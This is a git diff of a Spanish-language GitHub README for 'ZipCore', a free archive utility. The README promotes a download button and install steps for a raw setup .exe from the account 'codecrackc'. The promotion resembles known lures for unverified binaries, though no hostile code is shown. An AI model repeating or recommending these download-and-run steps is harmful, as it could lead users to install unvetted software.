@@ -30,22 +30,59 @@ const yo = {
 
 ```
 <p align="center">
-
-  <!-- PREVIEW DE LA APP -->
   <img src="fto 3.PNG" 
        alt="ZipCore Preview" 
-       width="500" 
-       style="border-radius: 12px; box-shadow: 0px 10px 30px rgba(0,0,0,0.4);" />
-
-  <br><br>
-
-  <!-- BOTÓN DESCARGA -->
-  <a href="https://github.com/codecrackc/ZIPCORE/raw/main/ZipCore_Gratis_Setup_v1.0.0.exe" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️_DESCARGAR_ZIPCORE-00F2FE?style=for-the-badge&logo=windows&logoColor=white&labelColor=0d1117" />
-  </a>
-
+       width="550" 
+       style="border-radius: 20px; box-shadow: 0px 15px 35px rgba(0,0,0,0.5);" />
 </p>
 
+<br>
+
+<p align="center">
+  <a href="https://github.com/codecrackc/ZIPCORE/raw/main/ZipCore_Gratis_Setup_v1.0.0.exe" target="_blank">
+    <img src="https://img.shields.io/badge/⬇️_DESCARGAR_ZIPCORE-00F2FE?style=for-the-badge&logo=windows&logoColor=white&labelColor=0d1117" 
+         alt="Descargar ZipCore" />
+  </a>
+</p>
+
+<br>
+
+## 🚀 Características principales
+
+- ⚡ **Compresión ultrarrápida** – Reduce tus archivos en segundos.
+- 🔒 **Protección con contraseña** – Seguridad AES-256 integrada.
+- 📁 **Soporte múltiple** – ZIP, RAR, 7Z y más formatos.
+- 🎨 **Interfaz moderna** – Diseño limpio y fácil de usar.
+
+<br>
+
+## 📦 Instalación
+
+1. Haz clic en el botón de **Descarga**.
+2. Ejecuta `ZipCore_Gratis_Setup_v1.0.0.exe`.
+3. Sigue los pasos del asistente de instalación.
+
+<br>
+
+## 🖥️ Requisitos del sistema
+
+| SO           | Windows 10 / 11 (64 bits)          |
+|--------------|-------------------------------------|
+| RAM          | 4 GB mínimo (8 GB recomendado)     |
+| Espacio      | 200 MB libres                      |
+
+<br>
+
+## 📄 Licencia
+
+Este proyecto está bajo la licencia **MIT**.  
+Consulta el archivo `LICENSE` para más detalles.
+
+<br>
+
+<p align="center">
+  Hecho con 💙 por <a href="https://github.com/codecrackc">@codecrackc</a>
+</p>
 <p align="center">
   <img src="banner-readme.svg" width="100%" />
 </p>
